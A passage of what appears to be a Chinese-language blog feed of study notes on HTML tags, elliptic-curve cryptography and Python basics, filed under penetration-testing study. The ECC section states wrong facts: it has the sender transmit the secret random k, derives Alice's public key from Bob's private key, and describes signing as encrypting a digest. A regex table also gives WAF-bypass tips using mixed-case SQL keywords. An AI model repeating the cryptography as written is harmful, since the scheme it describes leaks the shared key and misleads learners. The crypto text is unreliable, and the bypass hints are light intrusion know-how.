<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;图片的URL&quot;</span> /&gt;</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 当前目录中的图片 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;2.jpg&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./2.jpg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 上一级目录中的图片 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../2.jpg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">属性:</span><br><span class="line">width：图像的宽度。</span><br><span class="line">height：图像的高度。</span><br><span class="line">alt：当图片不可用（无法显示）的时候，代替图片显示的内容。</span><br><span class="line">title：提示性文本。鼠标悬停时出现的文本。</span><br></pre></td></tr></table></figure>
<h3 id="5列表标签"><a class="markdownIt-Anchor" href="#5列表标签"></a> 5.列表标签:</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">无序列表 <span class="tag">&lt;<span class="name">ul</span>&gt;</span> + <span class="tag">&lt;<span class="name">li</span>&gt;</span>      ---前面有圆点（•），顺序无关。</span><br><span class="line">有序列表 <span class="tag">&lt;<span class="name">ol</span>&gt;</span> + <span class="tag">&lt;<span class="name">li</span>&gt;</span>      ---自动编号（1、2、3 或 a、b、c）      </span><br><span class="line">    属性:type=&quot;A&quot; start=&quot;3&quot; </span><br><span class="line">定义列表 <span class="tag">&lt;<span class="name">dl</span>&gt;</span> + <span class="tag">&lt;<span class="name">dt</span>&gt;</span> + <span class="tag">&lt;<span class="name">dd</span>&gt;</span>   ---成对出现，解释说明。</span><br></pre></td></tr></table></figure>
<h3 id="6表格标签"><a class="markdownIt-Anchor" href="#6表格标签"></a> 6.表格标签:</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">table</span>&gt;</span>     整个表格的容器。</span><br><span class="line"></span><br><span class="line">2. <span class="tag">&lt;<span class="name">tr</span>&gt;</span> (table row)      表格的一行。</span><br><span class="line"></span><br><span class="line">3. <span class="tag">&lt;<span class="name">td</span>&gt;</span> (table data)        表格的单元格（普通数据）。</span><br><span class="line"></span><br><span class="line">4. <span class="tag">&lt;<span class="name">th</span>&gt;</span> (table header)        表格的表头单元格，默认加粗并居中。</span><br><span class="line"></span><br><span class="line">5. <span class="tag">&lt;<span class="name">caption</span>&gt;</span>                 表格的标题，显示在表格上方。</span><br><span class="line"></span><br><span class="line">6. <span class="tag">&lt;<span class="name">thead</span>&gt;</span> / <span class="tag">&lt;<span class="name">tbody</span>&gt;</span> / <span class="tag">&lt;<span class="name">tfoot</span>&gt;</span>            逻辑分组，便于结构化和样式控制。</span><br><span class="line">      <span class="tag">&lt;<span class="name">thead</span>&gt;</span>：            表头部分</span><br><span class="line">      <span class="tag">&lt;<span class="name">tbody</span>&gt;</span>：            主体部分</span><br></pre></td></tr></table></figure>
<h3 id="7框架标签"><a class="markdownIt-Anchor" href="#7框架标签"></a> 7.框架标签:</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://www.example.com&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">          ---在网页中内嵌另一个 HTML 页面。</span><br></pre></td></tr></table></figure>
<h3 id="8表单标签"><a class="markdownIt-Anchor" href="#8表单标签"></a> 8.表单标签:</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">属性:</span><br><span class="line">action	数据提交的目标地址（后台接口）	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span>&gt;</span></span><br><span class="line">method	提交方式（GET / POST）	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">enctype	数据编码方式（上传文件时用 multipart/form-data）	<span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span></span><br><span class="line">属性:</span><br><span class="line">text	单行文本	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">password	密码输入（内容不可见）	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>&gt;</span></span><br><span class="line">radio	单选按钮（同组只能选一个）	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;M&quot;</span>&gt;</span></span><br><span class="line">checkbox	复选框（可多选）	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobby&quot;</span> <span class="attr">value</span>=<span class="string">&quot;music&quot;</span>&gt;</span></span><br><span class="line">number	数字输入	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">min</span>=<span class="string">&quot;0&quot;</span> <span class="attr">max</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">email	邮箱验证	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">date	日期选择	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span>&gt;</span></span><br><span class="line">file	上传文件	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">submit	提交按钮	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">reset	重置按钮	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重置&quot;</span>&gt;</span></span><br><span class="line">button	普通按钮	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;点我&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span>&gt;</span> </span><br><span class="line">                                ---绑定文字和输入框，提高可用性。</span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;user&quot;</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span></span><br><span class="line">                        ---多行文本输入框</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;5&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span> + <span class="tag">&lt;<span class="name">option</span>&gt;</span></span><br><span class="line">              ---下拉菜单</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;bj&quot;</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;sh&quot;</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;gz&quot;</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="9多媒体标签"><a class="markdownIt-Anchor" href="#9多媒体标签"></a> 9.多媒体标签:</h3>
<p>多媒体包含：音频、视频、Flash。网页上的多媒体基本都是Flash格式的。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bgsound</span>&gt;</span>         ---播放背景音乐</span><br><span class="line">属性：</span><br><span class="line">    src=&quot;音乐文件的路径&quot;</span><br><span class="line">    loop=&quot;-1&quot;：属性值代表播放次数，-1代表循环播放。</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span>&gt;</span>         ---播放多媒体文件（音频、视频等）</span><br><span class="line">属性：</span><br><span class="line">    src=&quot;多媒体文件的路径&quot;</span><br><span class="line">    loop=&quot;-1&quot;：属性值代表播放次数，-1代表循环播放。</span><br><span class="line">    autostart=&quot;false&quot;：打开网页时，禁止自动播放。默认值是true。</span><br></pre></td></tr></table></figure>
<h2 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作:</h2>
<h3 id="1拖拽"><a class="markdownIt-Anchor" href="#1拖拽"></a> 1.拖拽:</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">draggable=&quot;true&quot;     ---允许拖拽</span><br></pre></td></tr></table></figure>
<h3 id="2历史"><a class="markdownIt-Anchor" href="#2历史"></a> 2.历史：</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTML5中可以通过 window.history 操作访问历史状态，让一个页面可以有多个历史状态</span><br><span class="line">window.history对象可以让我们管理历史记录，可用于单页面应用，Single Page Application，可以无刷新改变网页内容。</span><br><span class="line"></span><br><span class="line">window.history.forward(); // 前进</span><br><span class="line"></span><br><span class="line">window.history.back(); // 后退</span><br><span class="line"></span><br><span class="line">window.history.go(); // 刷新</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>基础语言</category>
        <category>Front</category>
        <category>html(结构标准)</category>
      </categories>
  </entry>
  <entry>
    <title>椭圆曲线密码</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="椭圆曲线密码ecc"><a class="markdownIt-Anchor" href="#椭圆曲线密码ecc"></a> 椭圆曲线密码(ECC):</h1>
<p>基于椭圆曲线离散对数问题（ECDLP）难解性</p>
<h2 id="1-密钥的生成"><a class="markdownIt-Anchor" href="#1-密钥的生成"></a> 1. 密钥的生成:</h2>
<p>在椭圆曲线加密中，密钥生成包括两部分：<strong>私钥</strong>和<strong>公钥</strong>。</p>
<ul>
<li>
<p><strong>私钥</strong>：随机选择一个大整数，通常通过一个安全的随机数生成器来生成。</p>
</li>
<li>
<p><strong>公钥</strong>：通过私钥和椭圆曲线的基点（生成点）进行运算生成。公钥是私钥与基点的乘积，记作：</p>
<p>Public Key=Private Key×G</p>
<p>其中 G 是椭圆曲线的基点。</p>
</li>
</ul>
<h2 id="2加密流程"><a class="markdownIt-Anchor" href="#2加密流程"></a> 2.加密流程:</h2>
<p>椭圆曲线集成加密方案（ECIES，Elliptic Curve Integrated Encryption Scheme）是一种使用椭圆曲线加密的标准方法，下面是ECIES的加密流程：</p>
<h4 id="加密方"><a class="markdownIt-Anchor" href="#加密方"></a> 加密方：</h4>
<ol>
<li>
<p><strong>选择公钥</strong>：接收方（Bob）将其公钥提供给发送方（Alice）。</p>
</li>
<li>
<p><strong>生成随机数</strong>：发送方随机选择一个整数 k，该整数与椭圆曲线基点 G 结合来生成加密密钥。</p>
</li>
<li>
<p><strong>计算共享密钥</strong>：发送方使用自己的私钥和接收方的公钥，计算共享密钥（共享密钥的计算基于椭圆曲线Diffie-Hellman协议）：</p>
<p>K=k×Bob’s Public Key     —Bob’s Public Key=Bob的私钥×G</p>
</li>
<li>
<p><strong>生成密文</strong>：使用共享密钥生成对称密钥，用来加密实际的数据（比如AES加密）。然后，计算加密后的数据和随机数的组合：</p>
<p>C=Encrypt(Message,Key)</p>
</li>
<li>
<p><strong>传输密文</strong>：发送方将密文和随机数 k 一起发送给接收方。</p>
</li>
</ol>
<h4 id="解密方"><a class="markdownIt-Anchor" href="#解密方"></a> 解密方：</h4>
<ol>
<li>
<p><strong>计算共享密钥</strong>：接收方使用自己的私钥和发送方的公钥计算共享密钥。</p>
<p>K=k×Alice’s Public Key      —Alice’s Public Key=Bob的私钥×G</p>
</li>
<li>
<p><strong>解密密文</strong>：接收方使用计算得到的共享密钥解密收到的密文。</p>
<p>Message=Decrypt(C,Key)</p>
</li>
</ol>
<h2 id="3数字签名ecdsa"><a class="markdownIt-Anchor" href="#3数字签名ecdsa"></a> 3.<strong>数字签名（ECDSA）</strong></h2>
<h3 id="1作用"><a class="markdownIt-Anchor" href="#1作用"></a> 1.作用:</h3>
<h4 id="身份验证authentication"><a class="markdownIt-Anchor" href="#身份验证authentication"></a> <strong>身份验证（Authentication）</strong></h4>
<p>数字签名能够证明消息确实是由消息的发送者发出的，并且没有被篡改。</p>
<ul>
<li><strong>公钥基础设施（PKI）</strong>：通过数字签名，接收方能够验证消息是否确实是由声明的发送方发出的。这是因为签名是使用发送方的私钥生成的，而只有拥有对应私钥的人才能生成有效的签名。因此，接收方可以使用发送方的公钥来验证签名是否有效，确保消息的发件人身份。</li>
</ul>
<h4 id="数据完整性data-integrity"><a class="markdownIt-Anchor" href="#数据完整性data-integrity"></a> <strong>数据完整性（Data Integrity）</strong></h4>
<p>数字签名确保了消息在传输过程中未被篡改。</p>
<ul>
<li><strong>哈希值</strong>：数字签名通常会对消息进行哈希运算（生成消息摘要），然后使用私钥对这个哈希值进行签名。如果消息内容在传输过程中被修改，计算得到的哈希值就会发生变化，验证签名时就会失败，从而能够检测到数据被篡改。</li>
</ul>
<h4 id="不可否认性non-repudiation"><a class="markdownIt-Anchor" href="#不可否认性non-repudiation"></a> <strong>不可否认性（Non-repudiation）</strong></h4>
<p>数字签名提供了不可否认性，即发送方不能否认自己已签署某个消息。</p>
<ul>
<li>由于数字签名是通过发送方的私钥生成的，且只有发送方拥有私钥，因此在签署之后，发送方不能声称自己没有发送过该消息。即使在后续，发送方也不能否认自己发送的消息。</li>
</ul>
<h4 id="防篡改"><a class="markdownIt-Anchor" href="#防篡改"></a> <strong>防篡改</strong></h4>
<p>数字签名还能够保证消息的完整性。任何在消息上的修改都会导致签名验证失败，防止数据在传输过程中被篡改。</p>
<h2 id="2流程"><a class="markdownIt-Anchor" href="#2流程"></a> 2.流程:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">发送方:</span><br><span class="line">    1.首先对要发送的二进制数据流进行哈希摘要</span><br><span class="line">                   --- 常用哈希摘要: MD5 ,SHA1  ,SHA256  </span><br><span class="line">    2.使用私钥对摘要进行加密(签名)</span><br><span class="line">接受方:</span><br><span class="line">    1.使用发送方的公钥对摘要进行解密</span><br><span class="line">    2.使用同样的哈希算法对二进制数据流进行计算</span><br><span class="line">    3.对比两次哈希是否一致，一致则未篡改</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>密码学</category>
        <category>非对称密码(公钥密码)</category>
      </categories>
  </entry>
  <entry>
    <title>python</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/JS_%E9%80%86%E5%90%91/python/python/</url>
    <content><![CDATA[<h2 id="3python用法"><a class="markdownIt-Anchor" href="#3python用法"></a> 3.python用法:</h2>
<h3 id="1切片"><a class="markdownIt-Anchor" href="#1切片"></a> 1.切片:</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">切片是 Python 提供的一种用于提取序列（字符串、列表、元组等）子集的机制。它允许你通过 起始索引、结束索引、步长 来访问序列中的元素。</span><br></pre></td></tr></table></figure>
<h4 id="1切片的基本格式"><a class="markdownIt-Anchor" href="#1切片的基本格式"></a> 1.切片的基本格式:</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s[start:stop:step]</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>start</code></td>
<td>起始索引（包含）</td>
</tr>
<tr>
<td><code>stop</code></td>
<td>结束索引（不包含）</td>
</tr>
<tr>
<td><code>step</code></td>
<td>步长（间隔），可以是负数</td>
</tr>
</tbody>
</table>
<h4 id="2可切片序列类型"><a class="markdownIt-Anchor" href="#2可切片序列类型"></a> 2.可切片序列类型:</h4>
<table>
<thead>
<tr>
<th>类型</th>
<th>是否支持切片</th>
</tr>
</thead>
<tbody>
<tr>
<td>字符串</td>
<td>✅ 支持</td>
</tr>
<tr>
<td>列表</td>
<td>✅ 支持</td>
</tr>
<tr>
<td>元组</td>
<td>✅ 支持</td>
</tr>
<tr>
<td>NumPy 数组</td>
<td>✅ （并支持多维切片）</td>
</tr>
<tr>
<td>自定义类</td>
<td>✅ 只要实现 <code>__getitem__</code></td>
</tr>
</tbody>
</table>
<h3 id="2re模块"><a class="markdownIt-Anchor" href="#2re模块"></a> 2.re模块;</h3>
<h4 id="1基础用法"><a class="markdownIt-Anchor" href="#1基础用法"></a> 1.基础用法:</h4>
<table>
<thead>
<tr>
<th>函数</th>
<th>用途</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>re.search()</code></td>
<td>匹配<strong>一个</strong>符合的</td>
<td><code>re.search(r'flag&#123;.*&#125;', s)</code></td>
</tr>
<tr>
<td><code>re.findall()</code></td>
<td>返回<strong>所有</strong>匹配内容</td>
<td><code>re.findall(r'\d+', s)</code></td>
</tr>
<tr>
<td><code>re.sub()</code></td>
<td>替换匹配项</td>
<td><code>re.sub(r'sleep\([^)]+\)', '1', payload)</code></td>
</tr>
<tr>
<td><code>re.match()</code></td>
<td>匹配开头（从头匹配）</td>
<td><code>re.match(r'^GET', line)</code></td>
</tr>
<tr>
<td><code>re.split()</code></td>
<td>正则分割字符串</td>
<td><code>re.split(r'\s+', s)</code></td>
</tr>
<tr>
<td><code>re.compile()</code></td>
<td>编译正则对象</td>
<td><code>r = re.compile(r'sleep\(\d+\)')</code></td>
</tr>
</tbody>
</table>
<h4 id="2正则表达式"><a class="markdownIt-Anchor" href="#2正则表达式"></a> 2.正则表达式;</h4>
<table>
<thead>
<tr>
<th>表达式</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>.</code></td>
<td>任意字符（不包括换行）</td>
<td><code>a.b</code> 匹配 <code>acb</code>, <code>arb</code></td>
</tr>
<tr>
<td><code>*</code></td>
<td>重复0次或多次</td>
<td><code>.*</code> 匹配任意字符串</td>
</tr>
<tr>
<td><code>+</code></td>
<td>重复1次或多次</td>
<td><code>\d+</code> 匹配 <code>123</code></td>
</tr>
<tr>
<td><code>?</code></td>
<td>0或1次（或非贪婪）</td>
<td><code>.*?</code> 匹配最短字符串</td>
</tr>
<tr>
<td><code>[...]</code></td>
<td>字符集</td>
<td><code>[0-9]</code> 匹配数字</td>
</tr>
<tr>
<td><code>[^...]</code></td>
<td>非字符集</td>
<td><code>[^A-Z]</code> 非大写字母</td>
</tr>
<tr>
<td><code>\d</code></td>
<td>数字（等价于 [0-9]）</td>
<td><code>\d&#123;4&#125;</code> 匹配4位数</td>
</tr>
<tr>
<td><code>\w</code></td>
<td>单词字符（字母数字下划线）</td>
<td><code>\w+</code> 匹配变量名</td>
</tr>
<tr>
<td><code>\s</code></td>
<td>空白字符</td>
<td><code>\s+</code> 匹配任意空格、换行</td>
</tr>
<tr>
<td><code>^</code></td>
<td>行首</td>
<td><code>^flag</code> 以 flag 开头</td>
</tr>
<tr>
<td><code>$</code></td>
<td>行尾</td>
<td><code>abc$</code> 以 abc 结尾</td>
</tr>
<tr>
<td>`</td>
<td>`</td>
<td>或</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>简写旗标</th>
<th>完整常量</th>
<th>黑客视角用途 / 功能说明</th>
<th>常见攻击场景</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>re.I</code></td>
<td><code>re.IGNORECASE</code></td>
<td>忽略大小写，匹配更宽松</td>
<td>绕过大小写 WAF 关键词过滤 (<code>SeLeCt</code>, <code>UnIoN</code>)</td>
</tr>
<tr>
<td><code>re.S</code></td>
<td><code>re.DOTALL</code></td>
<td>让 <code>.</code> 匹配换行，跨行抓取大块 Payload</td>
<td>抓多行注入语句、跨标签 XSS 片段</td>
</tr>
<tr>
<td><code>re.M</code></td>
<td><code>re.MULTILINE</code></td>
<td><code>^</code>/<code>$</code> 从<strong>行</strong>首尾而非全文首尾匹配</td>
<td>分析多行日志，一行一行定位恶意请求</td>
</tr>
<tr>
<td><code>re.X</code></td>
<td><code>re.VERBOSE</code></td>
<td>正则可加空格、换行、注释，团队协作易读</td>
<td>写复杂匹配规则（SQLMap 策略等）时避免维护地狱</td>
</tr>
<tr>
<td><code>re.A</code></td>
<td><code>re.ASCII</code></td>
<td><code>\w</code> <code>\d</code> 限定为 ASCII，防宽字节/Unicode 绕过</td>
<td>过滤混入全角/零宽字符的绕过 Payload</td>
</tr>
</tbody>
</table>
<h3 id="3url编码实现-urllibparse库"><a class="markdownIt-Anchor" href="#3url编码实现-urllibparse库"></a> 3.url编码实现( urllib.parse)库:</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>函数名</th>
<th>作用</th>
<th>示例</th>
<th>用法说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>urllib.parse.quote()</code></td>
<td>编码字符串（常用于路径）</td>
<td><code>quote(&quot;a b/c&quot;)</code> → <code>'a%20b%2Fc'</code></td>
<td>默认 <code>/</code> 不编码，可改 <code>safe=''</code> 强编码</td>
</tr>
<tr>
<td><code>urllib.parse.quote_plus()</code></td>
<td>编码字符串，并将空格转为 <code>+</code></td>
<td><code>quote_plus(&quot;a b/c&quot;)</code> → <code>'a+b%2Fc'</code></td>
<td>常用于 <code>application/x-www-form-urlencoded</code></td>
</tr>
<tr>
<td><code>urllib.parse.urlencode()</code></td>
<td>编码字典为查询参数</td>
<td><code>urlencode(&#123;'q':'ctf show','page':1&#125;)</code> → <code>'q=ctf+show&amp;page=1'</code></td>
<td>用于 GET 请求参数拼接</td>
</tr>
</tbody>
</table>
<h3 id="4unicode编码实现"><a class="markdownIt-Anchor" href="#4unicode编码实现"></a> 4.Unicode编码实现:</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">实现编码:</span><br><span class="line">    .encode(<span class="string">&#x27;unicode_escape&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">实现解码:</span><br><span class="line">    .encode(<span class="string">&#x27;utf-8&#x27;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="5venv虚拟环境"><a class="markdownIt-Anchor" href="#5venv虚拟环境"></a> 5.venv虚拟环境:</h3>
<p><strong>创建</strong>：<code>python3 -m venv .venv</code></p>
<p><strong>激活</strong>：<code>source .venv/bin/activate</code> (或对应命令)</p>
<p><strong>装包</strong>：<code>pip install ...</code></p>
<p><strong>退出</strong>：<code>deactivate</code></p>
<h3 id="6pymysql库"><a class="markdownIt-Anchor" href="#6pymysql库"></a> 6.pymysql库:</h3>
<h4 id="1连接mysql"><a class="markdownIt-Anchor" href="#1连接mysql"></a> 1.连接mysql：</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import pymysql</span><br><span class="line"></span><br><span class="line"># 连接参数</span><br><span class="line">connection <span class="operator">=</span> pymysql.connect(</span><br><span class="line">    host<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span>,       # 数据库主机地址，如远程填IP</span><br><span class="line">    <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;your_username&#x27;</span>,   # 用户名</span><br><span class="line">    password<span class="operator">=</span><span class="string">&#x27;your_password&#x27;</span>,  # 密码</span><br><span class="line">    database<span class="operator">=</span><span class="string">&#x27;your_db_name&#x27;</span>,   # 数据库名称</span><br><span class="line">    port<span class="operator">=</span><span class="number">3306</span>,              # 默认端口<span class="number">3306</span></span><br><span class="line">    charset<span class="operator">=</span><span class="string">&#x27;utf8mb4&#x27;</span>,      # 推荐设置字符集</span><br><span class="line">    autocommit<span class="operator">=</span><span class="literal">True</span>         # 是否自动提交（可选）</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 创建游标对象</span><br><span class="line"><span class="keyword">cursor</span> <span class="operator">=</span> connection.cursor()</span><br><span class="line"></span><br><span class="line"># 执行<span class="keyword">SQL</span>语句</span><br><span class="line">cursor.execute(&quot;SELECT VERSION()&quot;)</span><br><span class="line">version <span class="operator">=</span> cursor.fetchone()</span><br><span class="line">print(&quot;Database version:&quot;, version[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"># 关闭连接</span><br><span class="line">cursor.close()</span><br><span class="line">connection.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="7ascii和数字转化"><a class="markdownIt-Anchor" href="#7ascii和数字转化"></a> 7.ascii和数字转化:</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ord</span>()    ---转化为数字</span><br><span class="line"><span class="built_in">chr</span>()    ---转化为字母</span><br></pre></td></tr></table></figure>
<h3 id="8map的用法"><a class="markdownIt-Anchor" href="#8map的用法"></a> 8.map的用法:</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span> 是 Python 的一个内置函数，作用是：</span><br><span class="line">      把一个函数应用到可迭代对象（<span class="built_in">list</span>、<span class="built_in">tuple</span>、字符串等）的每个元素上，返回一个新的迭代器。</span><br><span class="line"><span class="built_in">map</span>(function, iterable):</span><br><span class="line">    function：你要应用的函数，可以是内置函数 <span class="built_in">int</span> / <span class="built_in">str</span>，也可以是自定义函数或 <span class="keyword">lambda</span></span><br><span class="line">    iterable：要迭代的对象（<span class="built_in">list</span>、<span class="built_in">tuple</span>、字符串、<span class="built_in">range</span> 等）</span><br></pre></td></tr></table></figure>
<h3 id="9字符串转json"><a class="markdownIt-Anchor" href="#9字符串转json"></a> 9.字符串转json:</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 一个 JSON 格式的字符串</span></span><br><span class="line">s = <span class="string">&#x27;&#123;&quot;name&quot;: &quot;wanyan&quot;, &quot;age&quot;: 31, &quot;skills&quot;: [&quot;ctf&quot;, &quot;reverse&quot;, &quot;python&quot;]&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 转成 Python 对象（字典/列表）</span></span><br><span class="line">data = json.loads(s)</span><br><span class="line"><span class="built_in">print</span>(data)        <span class="comment"># &#123;&#x27;name&#x27;: &#x27;wanyan&#x27;, &#x27;age&#x27;: 31, &#x27;skills&#x27;: [&#x27;ctf&#x27;, &#x27;reverse&#x27;, &#x27;python&#x27;]&#125;</span></span><br><span class="line"><span class="built_in">print</span>(data[<span class="string">&quot;name&quot;</span>])  <span class="comment"># wanyan</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>JS_逆向</category>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>协程分布式</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/JS_%E9%80%86%E5%90%91/python/%E5%8D%8F%E7%A8%8B%E5%88%86%E5%B8%83%E5%BC%8F/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>渗透学习</category>
        <category>JS_逆向</category>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>库学习</title>
